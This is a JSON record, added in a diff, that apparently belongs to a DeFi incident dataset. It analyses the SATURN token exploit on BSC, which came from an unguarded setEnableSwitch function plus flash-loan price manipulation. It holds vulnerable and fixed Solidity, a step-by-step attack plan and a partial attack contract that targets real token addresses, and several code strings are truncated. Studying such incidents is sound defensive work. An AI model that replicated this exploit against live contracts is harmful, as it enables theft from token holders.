@@ -1,0 +1,38 @@
+{
+ "id": "2024__2024-05-XX_SATURN_SetEnableSwitchManipulation",
+ "source_file": "2024/2024-05-XX_SATURN_SetEnableSwitchManipulation.md",
+ "title": "SATURN — setEnableSwitch Manipulation + Flash Loan Price Manipulation Analysis",
+ "date": "2024-05-01",
+ "protocol": "SATURN",
+ "chain": "BSC",
+ "loss_raw": "~15 BNB",
+ "loss_usd": null,
+ "root_cause": "The `setEnableSwitch(bool)` function lacks access control, allowing any arbitrary caller to disable swaps, force-transfer tokens, then re-enable swaps and manipulate the AMM spot price for profit",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no access control on setEnableSwitch\ncontract SATURNToken {\n    bool public swapEnabled = true;\n\n    // No onlyOwner — anyone can disable swaps\n    function setEnableSwitch(bool enabled) external {\n        swapEnabled = enabled;\n    }\n\n    function _transfer(address from, address to, uint256 amount) internal {\n        if (!swapEnabled && isPair[to]) {\n            revert(\"swap disabled\");\n        }\n        // ...\n    }\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Safe code\nfunction setEnableSwitch(bool enabled) external onlyOwner {\n    swapEnabled = enabled;\n    emit SwapEnabled(enabled);\n}"
+ ],
+ "steps": [
+  "→ [1] setEnableSwitch(false)",
+  "No access control → swaps disabled",
+  "→ [2] Force-transfer SATURN from holders",
+  "→ [3] setEnableSwitch(true) → swaps re-enabled",
+  "→ [4] PancakeSwap V3 flash loan: borrow 3,300 WBNB",
+  "→ [5] WBNB → SATURN bulk buy (price manipulation)",
+  "→ [6] Calculated SATURN transfer to distort price",
+  "→ [7] SATURN → WBNB reverse swap (at manipulated price)",
+  "→ [8] Repay V3 flash loan",
+  "→ [9] ~15 BNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] setEnableSwitch(false)\n  │         └─ No access control → swaps disabled\n  │\n  ├─→ [2] Force-transfer SATURN from holders\n  │         └─ Transfer possible while swaps are disabled\n  │\n  ├─→ [3] setEnableSwitch(true) → swaps re-enabled\n  │\n  ├─→ [4] PancakeSwap V3 flash loan: borrow 3,300 WBNB\n  │\n  ├─→ [5] WBNB → SATURN bulk buy (price manipulation)\n  │\n  ├─→ [6] Calculated SATURN transfer to distort price\n  │\n  ├─→ [7] SATURN → WBNB reverse swap (at manipulated price)\n  │\n  ├─→ [8] Repay V3 flash loan\n  │\n  └─→ [9] ~15 BNB profit",
+  "interface ISATURNToken {\n    function setEnableSwitch(bool enabled) external;\n    function everyTimeSellLimitAmount() external view returns (uint256);\n}\n\ninterface IPancakeV3Pool {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n}\n\ncontract AttackContract {\n    ISATURNToken  constant saturn  = ISATURNToken(0x9BDF251435cBC6774c7796632e9C80B233055b93);\n    IPancakeV3Pool constant v3Pool = IPancakeV3Pool(/* V3 WBNB pool */);\n    IERC20 constant SATURN = IERC20(0x9BDF251435cBC6774c7796632e9C80B233055b93);\n    IERC20 constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n\n    function testExploit() external {\n        // [1] Disable swaps (no access control)\n        saturn.setEnableSwitch(false);\n\n        // [2] Force-transfer"
+ ]
+}
